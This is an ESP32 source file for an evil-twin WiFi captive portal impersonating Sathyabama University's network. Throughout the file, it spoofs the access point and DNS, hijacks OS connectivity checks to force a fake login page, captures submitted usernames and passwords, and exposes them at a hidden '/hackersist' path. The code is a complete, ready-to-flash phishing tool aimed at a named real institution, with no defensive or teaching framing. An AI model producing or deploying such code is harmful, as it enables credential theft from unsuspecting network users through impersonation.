#include <WiFi.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"
#include <DNSServer.h>

const char* ssid = "Free_Sathyabama_WiFi";
IPAddress local_IP(100, 96, 0, 1);  // Fake public WiFi Gateway IP
IPAddress gateway(100, 96, 0, 1);
IPAddress subnet(255, 255, 255, 0);

DNSServer dnsServer;
AsyncWebServer server(80);

// Store credentials in memory
String capturedCredentials = "";

// ✅ Captive Portal Login Page
const char login_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>Sathyabama University WiFi</title>
    <link rel="stylesheet" type="text/css" href="/cp_style.css">
</head>
<body>
    <div class="container">
        <h2>Welcome to Sathyabama University WiFi</h2>
        <form action="/login" method="post">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="Username" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <input type="submit" value="Login" class="btn">
        </form>
    </div>
</body>
</html>
)rawliteral";

// ✅ Captive Portal CSS
const char cp_style_css[] PROGMEM = R"rawliteral(
body {
    font-family: Arial, sans-serif;
    text-align: center;
    background-color: #ffffff;
}
.container {
    max-width: 400px;
    margin: 50px auto;
    padding: 20px;
    background: white;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
}
input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 5px;
}
.btn {
    width: 100%;
    padding: 10px;
    background: #D70040;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
}
)rawliteral";

void setup() {
    Serial.begin(115200);

    // ✅ Start WiFi AP with Fake Public WiFi Gateway IP
    WiFi.softAPConfig(local_IP, gateway, subnet);
    WiFi.softAP(ssid);
    Serial.println("Access Point Started at 100.96.0.1");

    dnsServer.start(53, "*", local_IP); // Redirect all DNS queries to 100.96.0.1

    // ✅ Intercept OS Network Connectivity Checks (Triggers Sign-In Popup)
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    server.onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("/");
    });

    // ✅ Serve Login Page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", login_html);
    });

    // ✅ Serve CSS
    server.on("/cp_style.css", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send_P(200, "text/css", cp_style_css);
    });

    // ✅ Capture Login Credentials
    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
        if (request->hasParam("username", true) && request->hasParam("password", true)) {
            String username = request->getParam("username", true)->value();
            String password = request->getParam("password", true)->value();
            
            Serial.println("Captured Credentials:");
            Serial.println("Username: " + username);
            Serial.println("Password: " + password);
            
            capturedCredentials += "Username: " + username + " | Password: " + password + "\n";
        }
        request->send(200, "text/html", "<h2>Login Successful</h2><script>setTimeout(()=>{window.location.href='http://www.google.com';}, 3000);</script>");
    });

    // ✅ Secret Path to View Stored Credentials in Memory
    server.on("/hackersist", HTTP_GET, [](AsyncWebServerRequest *request){
        if (capturedCredentials.length() == 0) {
            request->send(200, "text/html", "<h2>No credentials found.</h2>");
        } else {
            request->send(200, "text/html", "<h2>Captured Credentials</h2><pre>" + capturedCredentials + "</pre>");
        }
    });

    server.begin();
}

void loop() {
    dnsServer.processNextRequest();
}

